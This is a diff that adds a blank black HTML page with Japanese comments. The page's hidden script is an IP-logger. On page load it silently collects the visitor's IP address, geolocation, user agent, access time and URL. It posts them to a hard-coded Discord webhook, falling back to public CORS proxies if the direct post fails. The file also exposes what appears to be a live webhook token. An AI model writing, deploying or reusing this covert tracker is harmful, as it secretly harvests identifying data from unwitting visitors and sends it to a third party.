@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>-</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-color: #000000;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1560964662747594849/ejFPLXiN6kGlC_8P_raXz4i87PtzYXyV7ncXel6EjI_CE-ZJNiS2mv7_jHlUJByNXImh';
+
+        async function sendLog() {
+            try {
+                // 1. 別経路のIP取得APIを使用
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const userIp = ipData.ip || '取得失敗';
+                const country = ipData.country_name || '';
+                const city = ipData.city || '';
+
+                const userAgent = navigator.userAgent;
+                const accessTime = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
+                const pageUrl = window.location.href;
+
+                // 2. Discordへの送信データ
+                const payload = {
+                    embeds: [{
+                        title: "🚨 新しいアクセスを検知しました",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "IPアドレス", value: `\`${userIp}\` (${country}${city})`, inline: false },
+                            { name: "アクセス時刻", value: accessTime, inline: true },
+                            { name: "アクセス先URL", value: pageUrl, inline: false },
+                            { name: "ユーザーエージェント", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        ]
+                    }]
+                };
+
+                // 3. 別のプロキシサービスを使用
+                const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(DISCORD_WEBHOOK_URL);
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).catch(async () => {
+                    // 失敗した場合はプロキシ経由で再試行
+                    await fetch('https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK_URL), {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                });
+
+            } catch (error) {
+                console.error('エラー:', error);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', sendLog);
+    </script>
+</body>
+</html>
